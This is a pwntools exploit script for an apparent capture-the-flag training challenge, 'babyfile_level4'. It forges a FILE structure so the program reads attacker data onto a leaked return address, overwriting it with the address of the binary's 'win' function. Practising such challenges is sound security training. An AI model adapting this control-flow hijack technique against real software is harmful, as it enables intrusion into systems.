#Nagib Lakhdari 3si2
from pwn import *

# Set the architecture context to amd64
context.arch = 'amd64'

# Load the ELF binary for the challenge
elf = ELF("/challenge/babyfile_level4")
# Start the process for the challenge binary
p = process("/challenge/babyfile_level4")

# Receive the output until the specific string is found
p.recvuntil(b"stored at: ")

# Extract the return address from the received output
ret_addr = int(p.recvuntil(b'\n')[-15:-1], 16)

# Create a file structure payload to read from the return address
fs = FileStructure()
payload = fs.read(ret_addr, 1000)

# Send the payload to the process
p.send(payload)

# Send the payload to overwrite the return address with the address of the 'win' function
p.send(p64(elf.sym['win']) + b"\x00" * (1000 - 8))

# Interact with the process to get the output
p.interactive()
